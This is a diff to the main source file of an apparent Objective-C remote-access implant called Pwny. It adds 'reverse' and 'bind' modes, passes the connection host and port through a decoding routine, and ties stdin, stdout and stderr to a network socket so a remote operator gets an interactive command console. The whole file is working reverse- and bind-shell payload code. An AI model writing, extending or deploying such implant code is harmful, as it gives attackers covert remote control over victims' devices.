@@ -22,29 +22,54 @@
 * SOFTWARE.
 */
 
+#import "crypto.h"
+
 #import "pwny.h"
 #import "console.h"
 #import "utils.h"
 
-void connectToServer(NSString *remote_host, int remote_port);
+Crypto *crypto = [[Crypto alloc] init];
+
+void listenServer(int remotePort);
+void connectServer(NSString *remote_host, int remote_port);
 
 int main(int argc, const char *argv[]) {
     @autoreleasepool {
-        if (argc < 3)
-            return -1;
-        else {
+        if (argc > 1) {
+            NSString *host, *port;
+
             NSMutableArray *args = [NSMutableArray array];
             for (int i = 0; i < argc; i++) {
                 NSString *str = [[NSString alloc] initWithCString:argv[i] encoding:NSUTF8StringEncoding];
                 [args addObject:str];
             }
-            connectToServer(args[1], [args[2] integerValue]);
-        }
+
+            if ([args[1] isEqualToString:@"reverse"]) {
+                if (argc >= 4) {
+                    host = [crypto crypto:args[2]];
+                    port = [crypto crypto:args[3]];
+                } else if (argc >= 3) {
+                    host = @"127.0.0.1";
+                    port = [crypto crypto:args[2]];
+                } else
+                    return -1;
+
+                connectServer(host, [port integerValue]);
+            } else if ([args[1] isEqualToString:@"bind"]) {
+                if (argc >= 3)
+                    port = [crypto crypto:args[2]];
+                else
+                    return -1;
+
+                listenServer([port integerValue]);
+            }
+        } else
+            return -1;
     }
     return 0;
 }
 
-void interactWithServer() {
+void interact() {
     Pwny *pwny = [[Pwny alloc] init];
     Console *console = [[Console alloc] init];
     Utils *utils = [[Utils alloc] init];
@@ -100,11 +125,38 @@ void interactWithServer() {
         } else if ([args[0] isEqualToString:@"exit"])
             break;
         else
-            [console console_log:@"Unrecognized command!\n"];
+            [console console_log_error:@"Unrecognized command!\n"];
     }
 }
 
-void connectToServer(NSString *remoteHost, int remotePort) {
+void listenServer(int localPort) {
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == -1)
+        return;
+
+    sockaddr_in hint;
+    hint.sin_family = AF_INET;
+    hint.sin_addr.s_addr = INADDR_ANY;
+    hint.sin_port = htons(localPort);
+
+    if (bind(sock, (struct sockaddr*)&hint, sizeof(hint)) < 0)
+        return;
+
+    if (listen(sock, 10) < 0)
+        return;
+
+    int addrlen = sizeof(hint);
+    int newsock = accept(sock, (struct sockaddr*)&hint, (socklen_t*)&addrlen);
+
+    dup2(sock, 0);
+    dup2(sock, 1);
+    dup2(sock, 2);
+
+    interact();
+    close(newsock);
+}
+
+void connectServer(NSString *remoteHost, int remotePort) {
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == -1)
         return;
@@ -121,6 +173,6 @@ void connectToServer(NSString *remoteHost, int remotePort) {
     dup2(sock, 1);
     dup2(sock, 2);
 
-    interactWithServer();
+    interact();
     close(sock);
 }
